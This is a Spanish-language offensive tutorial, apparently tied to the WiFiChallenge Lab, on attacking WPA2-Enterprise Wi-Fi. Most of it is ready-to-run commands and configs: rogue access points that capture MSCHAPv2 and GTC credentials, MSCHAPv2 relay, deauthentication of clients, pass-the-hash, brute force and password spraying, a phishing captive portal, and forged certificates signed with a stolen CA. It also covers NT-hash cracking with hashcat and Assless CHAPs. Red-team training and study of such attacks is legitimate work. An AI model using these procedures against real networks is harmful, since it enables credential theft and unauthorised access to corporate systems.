# Ataques Wi-Fi - MGT

### Ataque Rogue AP

El ataque de Rogue Access Point (AP) implica la creación de un punto de acceso no autorizado. Es importante tener en cuenta que este ataque solo funciona si se dan los siguientes 2 puntos.

* El cliente utiliza usuario y contraseña para la autenticación (no utiliza certificado).
* El cliente no verifica el certificado del servidor con una CA conocida.

Para realizar un ataque eficaz de Rogue AP, es necesario generar un certificado SSL falso. Este certificado es el que se va a mandar al cliente de la red para montar el túnel TLS, muy similar al certificado de las páginas web utilizadas en HTTPS. Para estos ataques vamos a utilizar principalmente eaphammer, por lo que tenemos que generar un certificado con el siguiente comando (esto solo hay que hacerlo la primera vez):

```
cd /root/tools/eaphammer
python3 ./eaphammer --cert-wizard
```

Es recomendable siempre poner en los campos de texto la misma información que se ha obtenido en el proceso de reconocimiento de las redes MGT, así si un cliente verifica manualmente los campos de texto del certificado se encontrará información correcta corporativa.

### Si el cliente usa MSCHAPv2

El Protocolo de Autenticación Desafío Mutuo (MSCHAPv2) es común en redes corporativas. Para eso creamos un AP malicioso con el mismo nombre que la red y esperamos a que un cliente se conecte (o realizamos un ataque de desautenticación para forzarlo).

```
python3 ./eaphammer -i wlan3 --auth wpa-eap --essid $ESSID --creds
```

<figure><img src="../../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

En el caso de que un cliente se conecte a la red y nos envíe credenciales aparecerán por pantalla, donde se puede ver un challenge y su response. Imprimiendo también el hash listo para crackear con hashcat:

```
hashcat -a 0 -m 5500 hashcat.5500 ~/rockyou-top100000.txt --force
```

<figure><img src="../../../.gitbook/assets/image (4) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (5) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

A diferencia de NetNTLMv1, que permite ataques de challenge pre-calculado, MS-CHAPv2 utiliza un "Peer-Challenge" aleatorio generado por el cliente, combinado con el challenge del servidor y el nombre de usuario en su ChallengeHash basado en SHA-1, de modo que no a pesar de mandar siempre el mismo challenge, su response cada vez sería diferente.

### Si el cliente usa GTC

Si el cliente utiliza GTC el ataque es prácticamente igual pero para evitar que la negociación con el AP tarde mucho y el cliente se acabe conectando a un AP legítimo podemos indicar a eaphammer que utilice primero los métodos EAP más inseguros, de esta forma se obtiene el usuario y la contraseña en texto claro sin necesidad de crackear, por lo no importa lo complicada que sea la contraseña.

```
python3 ./eaphammer -i wlan3 --auth wpa-eap --essid wifi-corp --creds --negotiate weakest
```

<figure><img src="../../../.gitbook/assets/image (6) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### Otras herramientas

Este ataque también se puede realizar con otras herramientas como airgeddon, que en este caso permite realizar el ataque utilizando su interfaz de CLI para todo el proceso

<figure><img src="../../../.gitbook/assets/image (7) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

## Manualmente

### **Generar certificado TLS**

El primer paso es generar una CA auto firmada:

```
#Creation Of A Self-Signed CA Certificate
openssl genrsa -out ca.key 2048

echo '[ req ]
default_bits       = 2048
distinguished_name = req_DN
string_mask        = nombstr

[ req_DN ]
countryName                     = "1. Country Name             (2 letter code)"
countryName_default             = ES
countryName_min                 = 2
countryName_max                 = 2
stateOrProvinceName             = "2. State or Province Name   (full name)    "
stateOrProvinceName_default     = Madrid
localityName                    = "3. Locality Name            (eg, city)     "
localityName_default            = Madrid
0.organizationName              = "4. Organization Name        (eg, company)  "
0.organizationName_default      = WiFiChallenge Lab
organizationalUnitName          = "5. Organizational Unit Name (eg, section)  "
organizationalUnitName_default  = Certificate Authority
commonName                      = "6. Common Name              (eg, CA name)  "
commonName_max                  = 64
commonName_default              = WiFiChallenge Lab CA
emailAddress                    = "7. Email Address            (eg, name@FQDN)"
emailAddress_max                = 40
emailAddress_default            = ca@WiFiChallenge.com' > ca.conf

openssl req -config ca.conf -new -key ca.key -out ca.csr
```

```
echo '
extensions = x509v3

[ x509v3 ]
basicConstraints      = CA:true,pathlen:0
crlDistributionPoints = URI:https://WiFiChallenge.com/ca/mustermann.crl
nsCertType            = sslCA,emailCA,objCA
nsCaPolicyUrl         = "https://WiFiChallenge.com/ca/policy.htm"
nsCaRevocationUrl     = "https://WiFiChallenge.com/ca/heimpold.crl"
nsComment             = "WiFiChallenge Lab CA"
' > ca.ext

openssl x509 -days 1095 -extfile ca.ext -signkey ca.key -in ca.csr -req -out ca.crt
```

El anterior comando nos crea un fichero ca.crt y un ca.key que corresponden a la clave privada y pública de nuestra CA. Para esto primero se crea un fichero de configuración llamado ca.conf con toda la información del certificado, estos campos se tienen que editar antes de ejecutarse para imitar el certificado real del cliente.

Una vez tenemos la CA podemos generar un certificado de servidor y firmarlo con esta CA.

```
#Creation Of A Server Certificate
openssl genrsa -out server.key 2048
echo '
[ req ]
default_bits       = 2048
distinguished_name = req_DN
string_mask        = nombstr

[ req_DN ]
countryName                     = "1. Country Name             (2 letter code)"
countryName_default             = ES
countryName_min                 = 2
countryName_max                 = 2
stateOrProvinceName             = "2. State or Province Name   (full name)    "
#stateOrProvinceName_default     =
localityName                    = "3. Locality Name            (eg, city)     "
localityName_default            = Madrid
0.organizationName              = "4. Organization Name        (eg, company)  "
0.organizationName_default      = WiFiChallenge Lab
organizationalUnitName          = "5. Organizational Unit Name (eg, section)  "
organizationalUnitName_default  = Server
commonName                      = "6. Common Name              (eg, CA name)  "
commonName_max                  = 64
commonName_default              = WiFiChallenge Lab CA
emailAddress                    = "7. Email Address            (eg, name@FQDN)"
emailAddress_max                = 40
emailAddress_default            = server@WiFiChallenge.com

' > server.conf

echo 'extensions = x509v3

[ x509v3 ]
nsCertType       = server
keyUsage         = digitalSignature,nonRepudiation,keyEncipherment
extendedKeyUsage = msSGC,nsSGC,serverAuth' > server.ext

echo -ne '01' > ca.serial

openssl req -config server.conf -new -key server.key -out server.csr

openssl x509 -days 730 -extfile server.ext -CA ca.crt -CAkey ca.key -CAserial ca.serial -in server.csr -req -out server.crt
```

Estos comandos generan un certificado de cliente con los parámetros configurados en el fichero de configuración y se firman con la CA, generando un certificado público server.crt y su clave server.key.

### **Fichero eap\_user**

Generamos un fichero de configuración con la información de los usuarios que acepte todo.

```
echo '
*		PEAP,TTLS,TLS,FAST
"t"	    TTLS-PAP,TTLS-CHAP,TTLS-MSCHAP,MSCHAPV2,MD5,GTC,TTLS,TTLS-MSCHAPV2  "t"	[2]
' > /etc/hostapd.eap_user
```

### **hostapd-mana vs hostapd-wpe**

hostapd-mana y hostapd-wpe son versiones modificadas de hostapd diseñadas para realizar ataques a redes Wi-Fi. hostapd-mana es una herramienta más avanzada y flexible que hostapd-wpe, ya que incluye características adicionales como la capacidad de hacer ataques de reenvío de credenciales y otros ataques. Por otro lado, hostapd-wpe, es una herramienta perfectamente funcional para realizar ataques de Evil Twin en redes MGT principalmente, por ejemplo, eaphammer utiliza está herramienta por detrás para levantar el AP y obtener las credenciales.

### **hostapd-mana**

Ahora podemos crear un fichero de configuración de hostapd-mana para el ataque.

```
# SSID of the AP
ssid=wifi-corp
# We must ensure the interface lists 'AP' in 'Supported interface modes' when running 'iw phy PHYX info'
interface=wlan2
driver=nl80211
# Channel and mode
# Make sure the channel is allowed with 'iw phy PHYX info' ('Frequencies' field - there can be more than one)
channel=44
# Refer to https://w1.fi/cgit/hostap/plain/hostapd/hostapd.conf to set up 802.11n/ac/ax
hw_mode=a
# Setting up hostapd as an EAP server
ieee8021x=1
eap_server=1
# Key workaround for Win XP
eapol_key_index_workaround=0
# EAP user file we created earlier
eap_user_file=/etc/hostapd.eap_user
# Certificate paths created earlier
ca_cert=/root/certs/ca.crt
server_cert=/root/certs/server.crt
private_key=/root/certs/server.key
# The password is actually 'whatever'
private_key_passwd=whatever
#dh_file=/root/certs/dh
# Open authentication
auth_algs=1
# WPA/WPA2
wpa=3
# WPA Enterprise
wpa_key_mgmt=WPA-EAP
# Allow CCMP and TKIP
# Note: iOS warns when network has TKIP (or WEP)
wpa_pairwise=CCMP TKIP
# Enable Mana WPE
mana_wpe=1
# Store credentials in that file
mana_credout=hostapd.credout
# Send EAP success, so the client thinks it's connected
mana_eapsuccess=1
#enable_sycophant=1
#sycophant_dir=/tmp/
# EAP TLS MitM
mana_eaptls=1
```

Este fichero de configuración establece cómo funcionará hostapd-mana para realizar un ataque de emulación de punto de acceso (AP) y captura de credenciales. Incluye configuraciones importantes como:

* **SSID y red**: Define el nombre y la interfaz del AP.
* **Modo y canal**: Especifica el canal y el modo de operación.
* **Servidor EAP**: Configura el AP como servidor EAP usando archivos de certificados generados previamente.
* **Seguridad**: Configura la autenticación WPA/WPA2/WPA3 y los algoritmos de cifrado.
* **Funciones de Mana**: Activa las características de captura de credenciales y el envío de éxito EAP para engañar al cliente.

Es crucial ajustar las rutas de los certificados para que apunten a los archivos correctos generados anteriormente.

Es importante modificar la ruta de la sección de los certificados para que sean los ficheros que hemos generado en el apartado anterior.

Y levantamos el AP:

```
sudo hostapd-mana /ruta/a/tu/archivo_de_configuracion.conf
```

### **hostapd-wpe**

O, de igual manera, crear uno para hostapd-wpe.

```
# SSID of the AP
    ssid=wifi-regional-tablets

# Network interface to use and driver type
# We must ensure the interface lists 'AP' in 'Supported interface modes' when running 'iw phy PHYX info'
interface=wlan2
driver=nl80211

# Channel and mode
# Make sure the channel is allowed with 'iw phy PHYX info' ('Frequencies' field - there can be more than one)
channel=44
# Refer to https://w1.fi/cgit/hostap/plain/hostapd/hostapd.conf to set up 802.11n/ac/ax
hw_mode=a

# Setting up hostapd as an EAP server
ieee8021x=1
eap_server=1

# Key workaround for Win XP
eapol_key_index_workaround=0

# EAP user file we created earlier
eap_user_file=/etc/hostapd.eap_user

# Certificate paths created earlier
ca_cert=/root/certs/ca.pem
server_cert=/root/certs/server.pem
private_key=/root/certs/server.key

# The password is actually 'whatever'
private_key_passwd=whatever
dh_file=/root/certs/dh

# Open authentication
auth_algs=1

# WPA/WPA2
wpa=3

# WPA Enterprise
wpa_key_mgmt=WPA-EAP
# Allow CCMP and TKIP
# Note: iOS warns when network has TKIP (or WEP)
wpa_pairwise=CCMP TKIP


# Enable Mana WPE
mana_wpe=1

# Store credentials in that file
mana_credout=hostapd.credout

# Send EAP success, so the client thinks it's connected
mana_eapsuccess=1

# EAP Replay with sycophant
#enable_sycophant=1
#sycophant_dir=/tmp/

# EAP TLS MitM
mana_eaptls=1
```

Y levantamos el AP:

```
sudo hostapd-wpe /ruta/a/tu/archivo_de_configuracion.conf
```

## Ataque de Reenvío (Relay Attack)

Un ataque de reenvío (en inglés, relay attack), permite al atacante reenviar las credenciales que nos envía el cliente hacia un AP legítimo, permitiéndonos acceder a la red sin necesidad de crackear el hash MSCHAPv2. Este ataque solo funciona en este método ya que MSCHAPv2 funciona con un Challenge y un Response sin ningún dato que identifique la conexión. Para realizar este ataque el atacante crea un AP malicioso esperando a que un cliente se conecte. Cuando esto ocurre, el atacante comienza un intento de conexión con el AP real con los mismos datos que manda el cliente legítimo, de este modo el AP real envía al atacante el Challenge que tiene que utilizar el cliente para contestar con el Response en base a la contraseña, esta información es reenviada a la víctima para que genere la respuesta correctamente y la envíe al AP malicioso y está la reenviará al AP real, por lo que para el AP real el cliente se ha autenticado correctamente.

En la siguiente imagen se puede ver un diagrama del proceso y como, al acabar el atacante se encuentra en un MiTM entre el cliente y el AP real, ya que este está conectado completamente de forma legítima con el AP real y el cliente con el atacante.

<figure><img src="../../../.gitbook/assets/image (8) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### wpa\_sycophant + berate\_ap

Para realizar este ataque se utiliza wpa\_sycophant junto a berate\_ap. Es un ataque que necesita de varias antenas y varios pasos, pero no es demasiado complicado. Se utilizan estas dos herramientas ya que se pueden conectar entre ellas para realizar todo el proceso de reenvío, por lo que actualmente no es posible realizarlo con eaphammer ni ninguna otra herramienta similar.

El primer paso es configurar wpa\_sycophant, este programa será el que se conecte al AP real obteniendo la información del cliente legitimo. Para esto podemos editar el fichero de configuración por defecto Reemplazando los campos necesarios. En este caso tenemos que modificar ESSID con el nombre de la red a la que queremos conectarnos y BSSID\_AP con la MAC de nuestra antena que vaya a crear el AP falso, eso se añade para no conectarnos a nuestro AP falso sino al real.

```
network={
  ssid="ESSID"
  ## The SSID you would like to relay and authenticate against.
  scan_ssid=1
  key_mgmt=WPA-EAP
  ## Do not modify
  identity=""
  anonymous_identity=""
  password=""
  ## This initialises the variables for me.
  ## -------------
  eap=PEAP
  phase1="crypto_binding=0 peaplabel=0"
  phase2="auth=MSCHAPV2"
  ## Dont want to connect back to ourselves,
  ## so add your rogue BSSID here.
  bssid_blacklist=BSSID_AP
}
```

En una terminal ejecutamos wpa\_sycophant para redireccionar toda la información al AP real cuando un cliente se conecte.

```
# Shell 1
cd ~/tools/wpa_sycophant/
./wpa_sycophant.sh -c wpa_sycophant_example.conf -i wlan3
```

Una vez con el wpa\_sycophant funcionando el siguiente paso es levantar el AP falso con berate\_ap, esta herramienta es muy similar a eaphammer pero se puede integrar con wpa\_sycophant, por lo que tenemos que usar está en vez de eaphammer:

```
# Shell 2
cd ~/tools/berate_ap/
./berate_ap --eap --mana-wpe --wpa-sycophant --mana-credout outputMana.log wlan1 lo ESSID
```

* \--wpa-sycophant: Habilita la sincronización entre wpa\_sycophant y berate\_ap
* wlan1 Indica la interfaz que se va a utilizar para crear el AP
* lo Interfaz con la que se va a hacer puente para los clientes que se conecten al AP, si queremos que los clientes tengan acceso a internet tendríamos que usar una interfaz conectada a internet, en este caso se elige usar la interfaz lo (loopback) para la demostración, ya que el cliente es simulado
* $ESSID: Nombre de la red a suplantar

Al ejecutar este programa nos preguntará los campos del certificado y lo generará, aquí hacemos lo mismo que con eaphammer, escribimos los campos detectados durante el proceso de reconocimiento.

Ahora, en otra terminal diferente podemos ejecutar el ataque de desautenticación contra el cliente para desconectar al cliente del AP real y que se conecte a nuestro AP.

```
# Shell 3
airmon-ng start wlan0
iwconfig wlan0mon channel $CHANNEL
aireplay-ng -0 0 wlan0mon -a $BSSID -c $MAC_CLIENT
```

* $CHANNEL Canal del AP real.
* $BSSID: MAC del AP a hacer el ataque.
* $MAC\_CLIENT Mac del cliente a hacer desautenticación.

En el caso de que de error al conectarse un cliente y no se reenvía la información al AP real se puede modificar el fichero de configuración de wpa\_sycophant Reemplazando phase1 con los siguiente: phase1="peapver=1", ya que en algunos APs es necesario la versión 1.

### wpa\_sycophant + hostapd-mana

Otra opción más manual para llevar a cabo este ataque sería con wpa\_sycophantyhostapd-mana. Este caso es muy similar al anterior, pero utiliza una versión modificada de hostapd-mana que realiza el ataque sin Relay.

Lo único que habría que modificar es habilitar la sección eliminando los comentarios dejando el fichero igual que en el apartado del RogueAP con hostapd-mana

```
# RELAY with sycophant
enable_sycophant=1
sycophant_dir=/tmp/
```

Una vez se ha creado el fichero de configuración de hostapd-mana el proceso es muy similar que con berate\_ap:

El primer paso es configurar wpa\_sycophant, este programa será el que se conecte al AP real obteniendo la información del cliente legitimo. Para esto podemos editar el fichero de configuración por defecto Reemplazando los campos necesarios. En este caso tenemos que modificar ESSID con el nombre de la red a la que queremos conectarnos y BSSID\_AP con la MAC de nuestra antena que vaya a crear el AP falso, eso se añade para no conectarnos a nuestro AP falso sino al real.

```
network={
  ssid="ESSID"
  ## The SSID you would like to relay and authenticate against.
  scan_ssid=1
  key_mgmt=WPA-EAP
  ## Do not modify
  identity=""
  anonymous_identity=""
  password=""
  ## This initialises the variables for me.
  ## -------------
  eap=PEAP
  phase1="crypto_binding=0 peaplabel=0"
  phase2="auth=MSCHAPV2"
  ## Dont want to connect back to ourselves,
  ## so add your rogue BSSID here.
  bssid_blacklist=BSSID_AP
}
```

En una terminal ejecutamos wpa\_sycophant para redireccionar toda la información al AP real cuando un cliente se conecte.

```
# Shell 1
cd ~/tools/wpa_sycophant/
./wpa_sycophant.sh -c wpa_sycophant_example.conf -i wlan3
```

Una vez con el wpa\_sycophant funcionando el siguiente paso es levantar el AP falso con hostapd-mana:

```
sudo hostapd-mana /ruta/a/tu/archivo_de_configuracion.conf
```

Recuerda crear y configurar la información del certificado y el fichero de usuarios "eap\_user"

Ahora, en otra terminal diferente podemos ejecutar el ataque de desautenticación contra el cliente para desconectar al cliente del AP real y que se conecte a nuestro AP.

```
# Shell 3
airmon-ng start wlan0
iwconfig wlan0mon channel $CHANNEL
aireplay-ng -0 0 wlan0mon -a $BSSID -c $MAC_CLIENT
```

* $CHANNEL Canal del AP real.
* $BSSID: MAC del AP a hacer el ataque.
* $MAC\_CLIENT Mac del cliente a hacer desautenticación.

### Pass-the-Hash en Redes Wi-Fi

Un vector de ataque a menudo subestimado en entornos Wi-Fi empresariales es la capacidad de realizar ataques Pass-the-Hash (PtH) contra redes WPA2-Enterprise usando MSCHAPv2. Para los miembros de Red Team, esta técnica puede ser una forma sigilosa de obtener acceso a la red sin necesidad de descifrar o forzar contraseñas, y es un buen método de persistencia en sistemas comprometidos siempre que haya acceso físico.

En configuraciones WPA2-Enterprise (como la configuración de wpa\_supplicant que se muestra a continuación), los usuarios se autentican con sus credenciales de AD mediante PEAP con MSCHAPv2. Lo que muchos no saben es que, si ya has obtenido el hash NT de un usuario (por ejemplo, a partir de una campaña de phishing previa o un relevo SMB), no necesitas su contraseña en texto claro para conectarte al Wi-Fi, solo el hash.

En un equipo Linux, puedes convertir una contraseña en UTF-8 a su hash NT así:

```
echo -n "YourP@ssw0rd" | iconv -f utf8 -t utf16le | openssl dgst -md4 -provider legacy
```

Ahora, podemos usar el hash para acceder a la red:

```
network={
    ssid="wifi-corp"
    scan_ssid=1
    key_mgmt=WPA-EAP
    eap=PEAP
    anonymous_identity="CONTOSO\\anonymous"
    identity="CONTOSO\\user"
    password=hash:74b86f22eac2cb6975369eb1540a4a15
    phase1="peapver=0"
    phase2="auth=MSCHAPV2"
}
```

Ref: https://wiki.archlinux.org/title/Wpa\_supplicant

### Fuerza bruta en redes MGT

El ataque de fuerza bruta implica intentar múltiples combinaciones de contraseñas hasta encontrar la correcta, aprovechando que cada usuario tiene su propia contraseña y es posible obtenerla de diferentes leaks de Internet o que sea predecible por ser muy común o la por defecto de la empresa. Este ataque lo podemos realizar con air-hammer.

```
echo 'DOMAIN\username' > username.list
./air-hammer.py -i wlan3 -e $ESSID -p $DICCIONARIO -u username.list
```

Se utiliza la herramienta air-hammer con una lista de diccionario de contraseñas para realizar un ataque de fuerza bruta contra una red MGT. Para esto creamos un fichero de usuarios, que en este caso puede ser únicamente 1 y un diccionario con contraseñas.

Este ataque es peligroso ya que normalmente el servidor de autenticación se conecta al Directorio Activo, por lo que lo normal es bloquear el usuario tras 3, 5 o 7 intentos dependiendo de la configuración.

### Password spraying en redes MGT

El password spraying es un método en el que se prueba una contraseña o un número pequeño de contraseñas en múltiples cuentas de usuario. Este enfoque minimiza el riesgo de bloqueo de cuenta debido a intentos fallidos múltiples, dado que se realiza a baja frecuencia y en un amplio número de cuentas.

Se genera una lista de usuarios con el dominio añadido y se usa air-hammer para realizar un password spraying con una contraseña común en múltiples cuentas.

```
echo '
DOMAIN\username1
DOMAIN\username2
DOMAIN\username3
' > usernames.list
./air-hammer.py -i wlan4 -e wifi-corp -P 12345678 -u usernames.list
```

También es posible realizar este ataque con eaphammer utilizando múltiples interfaces, por lo que es posible ir más rápido, pero en la actualidad no funciona correctamente.

### Phishing+RogueAP (captive-portal)

Esta técnica combina un ataque RogueAP con un portal cautivo de phishing. Al crear un AP falso y redirigir a los usuarios a un portal cautivo, se puede obtener información del cliente, como sus credenciales. Para ello creamos un AP falso con una red abierta, ya que si no tenemos la contraseña del usuario no puede ser con una red MGT, creamos un portal cautivo personalizado pidiendo al usuario información en un formulario imitando un inicio de sesión corporativo, de office o cualquier otro concepto.

El primer paso es crear un portal cautivo realista, esto se puede hacer editando el fichero del portal cautivo de eaphammer. Para ello editamos el fichero `./core/wskeyloggerd/templates/user_defined/login/body.html`.

Una vez editado la web podemos crear el AP falso.

```
cd ~/tools/eaphammer
sudo killall DNSmasq
./eaphammer --essid WiFi-Restaurant --interface wlan4 --captive-portal
```

Se crea un Rogue AP con un portal cautivo utilizando eaphammer para obtener las credenciales de los usuarios mediante phishing.

Este ataque también se puede hacer con airgeddon que tiene plantillas generadas directamente o con wifiphisher que está orientado a este tipo de ataques más automáticamente. Mi ataque favorito con wifiphisher es el que imita a Windows, que muestra un mensaje de error de que no hay internet emulando la ventana de redes Wi-Fi de Windows pidiendo que pongas la contraseña.

<figure><img src="../../../.gitbook/assets/image (9) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

```
wifiphisher -aI wlan0 -p wifi_connect --handshake-capture handshake.pcap
```

* -aI Interfaz para crear el AP falso
* -p Modulo de ataque a utilizar
* \--handshake-capture: Handshake real para verificar la contraseña.

## Crear AP con CA robada

Una vez se tiene acceso a una CA (Autoridad de Certificación) legítima, se puede crear un AP que use estos certificados para que los clientes se conecten sin sospechar ya que aunque verifiquen la CA del AP sería la legitima, por lo que nuestra AP falso sería indistinguible uno legítimo de cara al cliente.

```
cd /root/tools/eaphammer
python3 ./eaphammer --cert-wizard import --server-cert /path/to/server.crt --ca-cert /path/to/ca.crt --private-key /path/to/server.key --private-key-passwd whatever
```

Se importan los certificados robados a eaphammer y se crean un Rogue AP con estos certificados para interceptar las conexiones de los usuarios.

## Generar un certificado de cliente usando una CA robada

Con una CA robada, se puede emitir un certificado de cliente que permita la conexión a una red protegida autenticándose como un usuario legítimo. Al igual que generando los certificados manualmente el proceso es igual, generamos un fichero de configuración con la información del cliente y la firmamos con la CA.

```
#Creation Of A Client Certificate
openssl genrsa -out client.key 2048

echo '[ req ]
default_bits       = 2048
distinguished_name = req_DN
string_mask        = nombstr

[ req_DN ]
countryName                     = "1. Country Name             (2 letter code)"
countryName_default             = ES
countryName_min                 = 2
countryName_max                 = 2
stateOrProvinceName             = "2. State or Province Name   (full name)    "
stateOrProvinceName_default     = Madrid
localityName                    = "3. Locality Name            (eg, city)     "
localityName_default            = Madrid
0.organizationName              = "4. Organization Name        (eg, company)  "
0.organizationName_default      = WiFiChallenge Lab
organizationalUnitName          = "5. Organizational Unit Name (eg, section)  "
#organizationalUnitName_default  =
commonName                      = "6. Common Name              (eg, CA name)  "
commonName_max                  = 64
commonName_default              = WiFiChallenge Lab CA
emailAddress                    = "7. Email Address            (eg, name@FQDN)"
emailAddress_max                = 40
emailAddress_default            = client@WiFiChallengeLab.com' > client.conf

echo 'extensions = x509v3

[ x509v3 ]
nsCertType = client,email,objsign
keyUsage   = digitalSignature,nonRepudiation,keyEncipherment,dataEncipherment' > client.ext

openssl req -config client.conf -new -key client.key -out client.csr
openssl x509 -days 730 -extfile client.ext -CA ca.crt -CAkey ca.key -CAserial ca.serial -in client.csr -req -out client.crt
cat client.crt client.key > client.pem.crt
```

Se generan un par de claves y se emite un certificado de cliente utilizando la CA robada, permitiendo la autenticación en la red objetivo.

## Guía de Uso de Assless CHAPs

Assless CHAPs es una herramienta eficiente de SensePost para recuperar el NT hash usado en un intercambio MSCHAPv2/NTLMv1 cuando dispones del challenge y la response (por ejemplo, de una captura Wi-Fi EAP-WPE). Necesitas una base de datos de NT hashes; consulta "Creando tu propio diccionario de hashes" más abajo para más detalles. Presentada por primera vez en el RF Hacking Village de DEF CON 29.

### Técnica

MSCHAPv2 divide el NT hash en tres partes, usando cada una como clave DES sobre el mismo challenge de 8 bytes. Dos claves son de 7 bytes cada una, y la tercera son 2 bytes rellenos con NULLs. Forzar por fuerza bruta esos dos últimos bytes (65.535 posibilidades) revela la cola del NT hash, que puedes buscar en tu base de datos de NT hashes para reducir drásticamente el conjunto de candidatos. Esto es un trade-off espacio-tiempo (hash shucking) en lugar de un descifrado completo de la contraseña.

### Comparación de velocidad

En un MacBook Pro de 2016, comparando assless-chaps con hashcat (native DES kernel + GPUs):

*   **Small hashlist:**&#x43;opiar

    ```
    hashcat  0.50s user  0.27s system  55% cpu  1.405 total  
    assless  0.05s user  0.00s system 294% cpu  0.018 total
    ```
*   **rockyou:**&#x43;opiar

    ```
    hashcat  2.67s user  0.51s system  93% cpu  3.413 total  
    assless  0.05s user  0.01s system 281% cpu  0.021 total
    ```
*   **HIBP:**&#x43;opiar

    ```
    hashcat 59.97s user 11.72s system 136% cpu 52.603 total  
    assless  0.05s user  0.00s system 292% cpu  0.018 total
    ```

### Instalación

* **Versión Rust:** requiere cargo y SQLite ≥ 3.6.8.
* **Versión Python:** requiere python3, el CLI de sqlite3 y pycryptodome.
* **Utilidad de base de datos:** mksqlitedb.py requiere python3 y el CLI de sqlite3.

#### Uso de Assless CHAPs con rockyou en el laboratorio

```
python3 nthash-from-clear.py /root/rockyou-top100000.txt > /root/rockyou-top100000.csv
```

Algunos archivos pueden tener problemas de codificación y mostrar el siguiente error:

```
Traceback (most recent call last):
  File "nthash-from-clear.py", line 9, in 
    for pwd in clears.read().split('\n'):
  File "/usr/lib/python3.8/codecs.py", line 322, in decode
    (result, consumed) = self._buffer_decode(data, self.errors, final)
UnicodeDecodeError: 'utf-8' codec can't decode byte 0xf1 in position 5079963: invalid continuation byte
```

Para solucionarlo, usa:

```
iconv -f latin1 -t utf8 /root/rockyou-top100000.txt -o clears-utf8.txt
mv clears-utf8.txt /root/rockyou-top100000.txt
```

Luego prueba de nuevo:

```
python3 nthash-from-clear.py /root/rockyou-top100000.txt > /root/rockyou-top100000.csv
```

Instala la dependencia SQLite3:

```
sudo apt update && sudo apt install sqlite3 -y
```

Ahora podemos crear la base de datos:

```
python3 mksqlitedb.py /root/rockyou-top100000.db /root/rockyou-top100000.csv
```

<figure><img src="../../../.gitbook/assets/image (10) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

> NOTA: Convertir un archivo CSV a SQLite suele aumentar el tamaño en disco en aproximadamente un 61 %. Por ejemplo, el conjunto de datos rockyou pasa de 462 MiB como CSV a 746 MiB como base de datos SQLite, que luego se comprime a 339 MiB al archivarse con BZ2.

#### Uso de la versión Python 3 para obtener el hash

Proporciona el challenge, la response y tu base de datos de NT hashes:

```
python3 assless-chaps.py <challenge> <response> <hashes.db>
```

Ejemplo:

```
python3 assless-chaps.py 5d79b2a85966d347 556fdda5f67d2b746ca3315fd8b93adcab5c792790a92e87 /root/rockyou-top100000.db
```

<figure><img src="../../../.gitbook/assets/image (11) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Una vez tenemos el hash podemos acceder a la red haciendo un Pass The Hash, o buscar la contraseña en texto claro si la hemos sacado de un diccionario. Por ejemplo, para obtener la contraseña en el caso que hemos hecho de rockyou se podría hacer lo siguiente:

```
# Obtenemos la linea donde está el hash
grep -n 17ad06bdd830b7 /root/rockyou-top100000.csv
# Buscamos la linea en el txt, en texto claro (en este caso 4)
sed -n '4p' /root/rockyou-top100000.txt
```

También se podría utilizar un servicio como [https://baconhash.pw/](https://baconhash.pw/)

**Búsqueda de dos bytes (solo Python)**

Opcionalmente, pasa el archivo twobytes (ordenado por frecuencia) como cuarto argumento para acelerar la fuerza bruta de dos bytes:

```
python3 assless-chaps.py <challenge> <response> <db> twobytes
```

#### NTLMv1 SSP

Para NTLMv1 con SSP, usa ntlm-ssp.py para calcular el server challenge:

```
python3 ntlm-ssp.py <lm_response> <challenge>
```

Luego crackea como de costumbre:

```
./assless-chaps <server_challenge> <nt_response> <hashes.db>
```
